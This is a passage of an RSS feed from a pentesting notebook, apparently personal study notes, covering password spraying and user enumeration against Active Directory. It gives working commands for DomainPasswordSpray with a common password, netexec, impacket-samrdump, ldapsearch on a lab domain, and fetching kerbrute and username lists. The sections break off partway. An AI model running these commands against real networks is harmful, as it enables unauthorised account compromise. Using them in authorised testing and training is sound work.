      <description>&lt;h1 id=&#34;password-spray&#34;&gt;Password Spray&lt;a class=&#34;anchor&#34; href=&#34;#password-spray&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;Don&amp;rsquo;t get locked out. See &lt;a href=&#34;https://ag2s.ca/spellbook/8.-lateral-movement/ad-enumeration/password-policy/&#34;&gt;Password policy&lt;/a&gt;&#xA;Spray and pray&lt;/p&gt;&#xA;&lt;/blockquote&gt;&lt;p&gt;Generally, this is not a good method to obtain credentials. It is noisy, easy to get caught, and probability of success is low.&lt;/p&gt;&#xA;&lt;p&gt;Should be used as a last method available&lt;/p&gt;&#xA;&lt;h2 id=&#34;from-windows&#34;&gt;From Windows&lt;a class=&#34;anchor&#34; href=&#34;#from-windows&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;h3 id=&#34;domainpasswordsprayps1&#34;&gt;&lt;code&gt;DomainPasswordSpray.ps1&lt;/code&gt;&lt;a class=&#34;anchor&#34; href=&#34;#domainpasswordsprayps1&#34;&gt;#&lt;/a&gt;&lt;/h3&gt;&#xA;&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;Download, then transfer the ps module to windows with any method in &lt;code&gt;Misc/File Transfer&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://github.com/dafthack/DomainPasswordSpray/raw/refs/heads/master/DomainPasswordSpray.ps1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Import module&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Import-Module .\DomainPasswordSpray.ps1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Spray and pray&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;from-linux&#34;&gt;From Linux&lt;a class=&#34;anchor&#34; href=&#34;#from-linux&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;h3 id=&#34;hydra&#34;&gt;&lt;code&gt;hydra&lt;/code&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hydra&#34;&gt;#&lt;/a&gt;&lt;/h3&gt;&#xA;&lt;p&gt;General syntax&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://ag2s.ca/spellbook/8.-lateral-movement/user-enumeration/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://ag2s.ca/spellbook/8.-lateral-movement/user-enumeration/</guid>
      <description>&lt;h2 id=&#34;netexec&#34;&gt;&lt;code&gt;netexec&lt;/code&gt;&lt;a class=&#34;anchor&#34; href=&#34;#netexec&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;netexec smb $target -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$pass&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; --users&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;impacket-samrdump&#34;&gt;&lt;code&gt;impacket-samrdump&lt;/code&gt;&lt;a class=&#34;anchor&#34; href=&#34;#impacket-samrdump&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-samrdump $target&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ldapsearch&#34;&gt;&lt;code&gt;ldapsearch&lt;/code&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ldapsearch&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ldapsearch -h $target -x -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DC=INLANEFREIGHT,DC=LOCAL&amp;#34;&lt;/span&gt; -s sub &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(&amp;amp;(objectclass=user))&amp;#34;&lt;/span&gt;  | grep sAMAccountName: | cut -f2 -d&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;kerbrute&#34;&gt;&lt;code&gt;kerbrute&lt;/code&gt;&lt;a class=&#34;anchor&#34; href=&#34;#kerbrute&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;p&gt;Clone username list repo&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clone https://github.com/insidetrust/statistically-likely-usernames.git&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Download &lt;code&gt;kerbrute&lt;/code&gt; binary. Yes, it does not exist in kali&amp;rsquo;s package manager. And sadly, at the time of writing, it hasn&amp;rsquo;t been updated since 2019&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mv kerbrute_linux_amd64 kerbrute&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chmod +x kerbrute&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Depends on the account naming convention, chose the correct username list file.&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
